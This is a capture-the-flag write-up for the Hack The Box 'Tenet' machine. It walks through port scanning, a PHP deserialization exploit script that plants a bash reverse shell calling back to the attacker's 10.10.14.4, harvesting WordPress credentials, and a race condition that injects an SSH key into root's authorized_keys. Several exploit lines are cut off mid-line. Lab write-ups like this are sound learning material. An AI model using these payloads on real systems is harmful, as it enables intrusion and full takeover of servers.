---
layout: post
author: Razor
title: "Hackthebox Tenet"
categories: [Hackthebox, Linux]
tags: [enumeration ,boot2root, medium-box, rce php, web exploitation, privilage escalation, cve]     # TAG names should always be lowercase
image: assets/htb_tenet/bg.png
toc: true
---

## Introduction 

The tenet machine of Hackthebox is an active machine. here we will learn a lot about RCE in php and other privileges. I suggest you read all of these writeups to understand what's going on here. you can join this room in [here](https://www.hackthebox.eu/home/machines/profile/309)

## Enumeration

### Nmap 
first we must scanning the machine :
```
$ sudo nmap -sC -sV 10.10.10.223  

Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 21:56 WIB
Nmap scan report for tenet.htb (10.10.10.223)
Host is up (0.020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tenet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
```

Thats only 2 port open. now lets put tenet.htb to /etc/hosts and see what happen.
```
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       Razor

10.10.10.223 tenet.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
now after that lets jump to webserver : http://tenet.htb

![image](/assets/htb_tenet/bg_1.png)

After I looking around on the website I found a comment on the migration tab which gives us a hint, namely "The sator php", let's try inputting Sator into a subdomain and looking for the sator.php file:

```
sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       Razor

10.10.10.223 tenet.htb sator.tenet.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
and thats right, subdomain is working but its just only default webpage from apache.

![image](/assets/htb_tenet/bg_2.png)

Lets put sator.php on this subdomain : 

![image](/assets/htb_tenet/bg_3.png)

now you can grab php with add extension .bak and we can analysis : 

![image](/assets/htb_tenet/bg_4.png)

There is the code : 
```bat
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```
## Exploit

after searchings i found insecure php serialization payload, you can see at [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Files/PHP-Serialization-RCE-Exploit.php)

and i'm modification that to this :

```bat
<?php
class DatabaseExport
{
        public $user_file = 'razor-exploit.php';
                                               
        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.4>
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data>
                echo '[Anjay abang ganteng lagi exploit code nya nich]';
        }
}
$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new Database>
$response = file_get_contents("$url");
$response = file_get_contents("http://10.10.10.223/razor-exploit.php");
?>
```
In Hacker command : ` nc -lvnp 4444 `
then run command : ` php razor.php `

```
$ php back.php     
[Anjay abang ganteng lagi exploit code nya nich]PHP Warning:

```
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.223] 34284
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
then we are connected to shell webserver 

### User

After looking around i found wp-config which is contain credential of user : 

![image](/assets/htb_tenet/bg_5.png)

```
neil@tenet:/var/www/html/wordpress$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:/var/www/html/wordpress$ cd /home/neil/
neil@tenet:~$ ls
user.txt
neil@tenet:~$ cat user.txt 
6a9d38459e130f9f9a0c56958f96a1a1
neil@tenet:~$ 
```
We got user.txt

### Privilage Escalation

lets look privilage of user neil : 

```
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```
we have to access : /usr/local/bin/enableSSH.sh
```bat
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1
        fi
}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

```
from thats script we can inject to getting root.
- first create id_rsa on your machine ` ssh-keygen `
- then create script like this : 
```bat
while true
do 
echo ' put id_rsa.pub' |tee /tmp/ssh-*
done
```
- then put id_rsa.pub to script 
```bat
while true
do 
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuC30kS7Gb89F8nYQetIKn6mgjGSA5nmX8fn3WQ2Gim+iBJPTmeIF6skdkM4z8//gejqC9RP5TkkuOIhxPcbI5i8Jz5lF2DbvLeUSJp2OfVQuI4DxmHTGwzMvIA40hkYSvwvgYErJAfZLLOuNyMOH6s4g6Ng970947N9P1094Z1fzavO4ahYHrM9Uyje6ceUIBstZe4Ma57Rgi3FCV8tmUkmS/gskWo1cR2pTmtucvsP8rGB2+X86y/pLkd3iipX4k2DhOCeSH894roy6uLB0+EEg3pRo2Ge0IOym0KI5o11gt0JS3hwF9I2REwODyolH5j/lZBtngDag2oCC5KqWVJGd6yha+nCmZWwifckFEpNbfNA0L3gSxpQJ5aE/xKJZffcMPfMdBHZzoz2q53XKmBUhXKeORsU42KiV+CbPxinz6OjXcSsIpw3IB/99HpoMW2tFZKLZYZVcM9vWjCg7Q2CJZUgPrwNBBSTi3LlFzSkmPsQXxclDA21fPnBmip1c=' |tee /tmp/ssh-*
done
```
- chmod 600 to id_rsa
- then run the scipt ./looping.sh
- script will still looping, we can leave that alone and log in again at a different term
- in second term run this " sudo /usr/local/bin/enableSSH.sh " for 4 times
- and we connect in hacker machines : 
```
ssh -i id_rsa root@10.10.10.223
```
![image](/assets/htb_tenet/bg_root.png)

if thats doesn't work you can reply again until it works

Happy hacking :D